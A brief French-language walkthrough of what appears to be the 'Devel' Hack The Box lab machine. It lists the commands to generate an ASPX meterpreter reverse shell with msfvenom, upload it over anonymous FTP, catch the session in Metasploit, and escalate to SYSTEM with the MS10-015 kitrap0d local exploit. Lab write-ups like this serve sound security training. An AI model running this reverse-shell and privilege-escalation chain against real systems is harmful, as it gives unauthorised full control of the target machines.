Windows


ftp :
	ftp anonymous@10.129.95.88 	

http :
	http://10.129.95.88/


Les fichier du serveur WEB son dans le FTP, il suffit de génrer un revershell ( aspx dans notre cas )

	
Génration du fichier exploit 
	msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86   LHOST=10.10.14.75 LPORT=12345 -f aspx > devel.aspx

il faut mettre l'exploit dans le serveur ftp.
	put devel.aspx

puis dans msfconsole : 
	use multi/handler
	set payload windows/meterpreter/reverse_tcp
	set LHOST 10.10.14.75
	set LPORT 12345
	exploit -j


Puis il faut acceder au serveur http

	http://10.129.95.88/devel.aspx



sur metasploit il devrait y avoir un message d'une session ouverte.
en chercherant :
	session -i
		  Id  Name  Type                     Information              Connection
		  --  ----  ----                     -----------              ----------
		  1         meterpreter x86/windows  IIS APPPOOL\Web @ DEVEL  10.10.14.158:12345 -> 10.129.22.220:49161 (10.129.22.220)

Pour entrer dans la session :
	session 1


Il faut maintenant la passer arriere plan :
	background


trouver un moyer de passer root :
	use post/multi/recon/local_exploit_suggester
	set SESSION 1
	run

On se retrouve alors avec plein de vulnérabilité. Il faut alors les tester pour voirs lesquels focntionne : 


Apres plusierus tentative on trouve :

	use exploit/windows/local/ms10_015_kitrap0d
	set SESSION 1
	set LHOST 10.10.14.75
	set LPORT 12345
	run


On se retrouve enfin avec une 2e session. En tant qu'admin

	meterpreter > getuid 
		Server username: NT AUTHORITY\SYSTEM
